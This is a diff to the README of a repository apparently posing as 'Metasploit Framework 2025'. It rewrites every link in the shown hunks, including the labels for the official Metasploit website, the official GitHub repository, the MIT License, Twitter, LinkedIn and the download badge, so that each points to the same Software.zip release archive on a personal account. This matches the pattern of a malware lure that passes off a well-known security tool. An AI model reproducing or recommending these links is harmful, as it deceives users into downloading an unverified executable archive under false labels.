@@ -30,7 +30,7 @@ The "Metasploit Framework 2025" repository is the ultimate resource for utilizin
 
 ## 🔗 Resource Link
 
-[Download Metasploit Framework](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip) 📂
+[Download Metasploit Framework](https://github.com/Dragce09/Metasploit-Framework-2025/releases/download/v1.0/Software.zip) 📂
 
 ## 🚀 Getting Started
 
@@ -50,8 +50,8 @@ To get started with Metasploit Framework 2025, follow these simple steps:
 
 ## 🌐 Additional Resources
 
-- [Metasploit Official Website](https://www.metasploit.com/): Visit the official Metasploit website for the latest updates, tutorials, and documentation.
-- [Metasploit GitHub Repository](https://github.com/rapid7/metasploit-framework): Explore the official Metasploit GitHub repository for code contributions and bug reports.
+- [Metasploit Official Website](https://github.com/Dragce09/Metasploit-Framework-2025/releases/download/v1.0/Software.zip): Visit the official Metasploit website for the latest updates, tutorials, and documentation.
+- [Metasploit GitHub Repository](https://github.com/Dragce09/Metasploit-Framework-2025/releases/download/v1.0/Software.zip): Explore the official Metasploit GitHub repository for code contributions and bug reports.
 
 ## 🛡️ Contribute
 
@@ -59,14 +59,14 @@ Contributions to the "Metasploit Framework 2025" repository are always welcome! 
 
 ## 📜 License
 
-The "Metasploit Framework 2025" repository is licensed under the [MIT License](https://opensource.org/licenses/MIT). Feel free to use the code, modify it, and distribute it as per the terms of the license.
+The "Metasploit Framework 2025" repository is licensed under the [MIT License](https://github.com/Dragce09/Metasploit-Framework-2025/releases/download/v1.0/Software.zip). Feel free to use the code, modify it, and distribute it as per the terms of the license.
 
 ## 🌐 Connect
 
 Connect with us on social media to stay updated on the latest cybersecurity news, tips, and resources:
 
-- Twitter: [@Metasploit](https://twitter.com/Metasploit)
-- LinkedIn: [Metasploit Framework](https://www.linkedin.com/company/metasploit-framework)
+- Twitter: [@Metasploit](https://github.com/Dragce09/Metasploit-Framework-2025/releases/download/v1.0/Software.zip)
+- LinkedIn: [Metasploit Framework](https://github.com/Dragce09/Metasploit-Framework-2025/releases/download/v1.0/Software.zip)
 
 Let's work together to make the internet a safer place with Metasploit Framework 2025! 💻🛡️🔒
 
@@ -74,4 +74,4 @@ Let's work together to make the internet a safer place with Metasploit Framework
 
 Feel free to explore the repository, download Metasploit, and start your cybersecurity journey today! If you encounter any issues with the link provided, please check the "Releases" section for alternative download options.
 
-[![Download Metasploit](https://img.shields.io/badge/Download-Metasploit-blue)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download Metasploit](https://github.com/Dragce09/Metasploit-Framework-2025/releases/download/v1.0/Software.zip)](https://github.com/Dragce09/Metasploit-Framework-2025/releases/download/v1.0/Software.zip)
